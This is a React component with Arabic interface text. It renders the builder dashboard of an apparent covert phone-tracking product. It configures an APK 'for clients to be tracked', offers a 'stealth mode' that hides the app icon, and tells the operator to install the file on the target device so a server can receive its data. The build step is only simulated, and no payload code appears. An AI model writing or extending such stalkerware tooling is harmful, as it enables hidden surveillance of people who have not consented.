import { useState } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Badge } from "@/components/ui/badge";
import { Shield, Download, Smartphone, Lock, CheckCircle2, AlertCircle, Loader2 } from "lucide-react";
import { toast } from "sonner";

export default function ClientBuilder() {
  const [isBuilding, setIsBuilding] = useState(false);
  const [config, setConfig] = useState({
    appName: "Client Tracker",
    serverUrl: window.location.origin,
    encryptionEnabled: true,
    stealthMode: false,
  });

  const handleBuild = () => {
    setIsBuilding(true);
    // Simulate build process
    setTimeout(() => {
      setIsBuilding(false);
      toast.success("تم إنشاء تطبيق العميل بنجاح!");
    }, 3000);
  };

  return (
    <DashboardLayout>
      <div className="p-6 max-w-4xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-3xl font-bold tracking-tight">منشئ تطبيق العميل</h1>
            <p className="text-muted-foreground">قم بإنشاء وتخصيص تطبيق APK للعملاء المراد تتبعهم</p>
          </div>
          <Badge variant="outline" className="px-3 py-1">
            <Shield className="w-4 h-4 mr-2 text-primary" />
            اتصال مشفر
          </Badge>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          <Card>
            <CardHeader>
              <CardTitle>إعدادات التطبيق</CardTitle>
              <CardDescription>قم بتكوين الخصائص الأساسية لملف APK</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="appName">اسم التطبيق</Label>
                <Input 
                  id="appName" 
                  value={config.appName} 
                  onChange={(e) => setConfig({...config, appName: e.target.value})}
                  placeholder="مثال: My Tracker"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="serverUrl">عنوان السيرفر</Label>
                <Input 
                  id="serverUrl" 
                  value={config.serverUrl} 
                  readOnly
                  className="bg-muted"
                />
              </div>
              
              <div className="flex items-center justify-between p-3 border rounded-lg">
                <div className="space-y-0.5">
                  <Label className="text-base flex items-center gap-2">
                    <Lock className="w-4 h-4" />
                    تشفير البيانات
                  </Label>
                  <p className="text-sm text-muted-foreground">تأمين جميع الاتصالات بين العميل والسيرفر</p>
                </div>
                <Switch 
                  checked={config.encryptionEnabled} 
                  onCheckedChange={(val) => setConfig({...config, encryptionEnabled: val})}
                />
              </div>

              <div className="flex items-center justify-between p-3 border rounded-lg">
                <div className="space-y-0.5">
                  <Label className="text-base flex items-center gap-2">
                    <Shield className="w-4 h-4" />
                    وضع التخفي
                  </Label>
                  <p className="text-sm text-muted-foreground">إخفاء أيقونة التطبيق من قائمة التطبيقات</p>
                </div>
                <Switch 
                  checked={config.stealthMode} 
                  onCheckedChange={(val) => setConfig({...config, stealthMode: val})}
                />
              </div>
            </CardContent>
            <CardFooter>
              <Button 
                className="w-full" 
                onClick={handleBuild} 
                disabled={isBuilding}
              >
                {isBuilding ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    جاري إنشاء APK...
                  </>
                ) : (
                  <>
                    <Smartphone className="mr-2 h-4 w-4" />
                    إنشاء تطبيق العميل
                  </>
                )}
              </Button>
            </CardFooter>
          </Card>

          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle>حالة الاتصال</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center gap-3 text-green-600">
                  <CheckCircle2 className="w-5 h-5" />
                  <span className="text-sm font-medium">السيرفر جاهز لاستقبال البيانات</span>
                </div>
                <div className="flex items-center gap-3 text-blue-600">
                  <Lock className="w-5 h-5" />
                  <span className="text-sm font-medium">نظام التشفير (AES-256) نشط</span>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-primary/5 border-primary/20">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <AlertCircle className="w-5 h-5 text-primary" />
                  كيف يعمل؟
                </CardTitle>
              </CardHeader>
              <CardContent className="text-sm space-y-2 text-muted-foreground">
                <p>1. قم بضبط الإعدادات المطلوبة للتطبيق.</p>
                <p>2. اضغط على زر "إنشاء تطبيق العميل" لبدء عملية البناء.</p>
                <p>3. بعد الانتهاء، سيظهر رابط تحميل ملف APK.</p>
                <p>4. قم بتثبيت الملف على الجهاز المراد تتبعه.</p>
              </CardContent>
            </Card>
            
            {!isBuilding && (
              <Button variant="outline" className="w-full">
                <Download className="mr-2 h-4 w-4" />
                تحميل آخر نسخة تم إنشاؤها
              </Button>
            )}
          </div>
        </div>
      </div>
    </DashboardLayout>
  );
}
